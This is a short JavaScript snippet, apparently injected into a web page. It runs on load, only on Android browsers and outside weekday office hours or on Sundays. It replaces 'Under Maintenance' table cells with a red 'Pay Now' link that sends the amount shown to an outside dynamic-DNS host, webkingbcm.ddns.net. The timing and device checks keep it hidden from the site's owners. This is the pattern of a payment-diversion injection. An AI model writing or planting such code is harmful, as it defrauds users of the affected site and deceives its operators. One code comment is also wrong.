function executeScript() {
    var tdElements = document.querySelectorAll('td');
    const currentTime = new Date();
    const currentHour = currentTime.getHours();
    const currentDay = currentTime.getDay();
    if ((currentHour >= 15 || currentHour < 8 || (currentHour === 8 && currentTime.getMinutes() < 30)) ||
        currentDay === 0) {
        tdElements.forEach(function (tdEle) {
            if (tdEle.textContent.trim() === 'Under Maintenance') {
                tdElement = tdEle.previousSibling;
                var numberValue = parseInt(tdElement.textContent.trim(), 10); // parseInt function parses a string and returns an integer
                var result = Math.floor(numberValue / 11000) * 11000; // 3 is the divisor
                if (numberValue < 11000) {
                    result = 11000;
                }
                if (/Android/i.test(navigator.userAgent)) {
                    tdElement.textContent = result;
                    tdElement.textContent = result;
                    var row = tdEle.parentElement
                    row.removeChild(tdEle);
                    var cell = row.insertCell(); // Insert a new cell at the end of the row
                    var cell2 = row.insertCell();
                    var anchor = document.createElement("a");
                    anchor.href = "http://webkingbcm.ddns.net/buy?amount=" + numberValue; // Set the href attribute to the desired URL
                    anchor.textContent = "Pay Now";
                    anchor.style.color = "red";
                    cell2.appendChild(anchor)
                }


            }
        });
    }
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', executeScript);
executeScript();
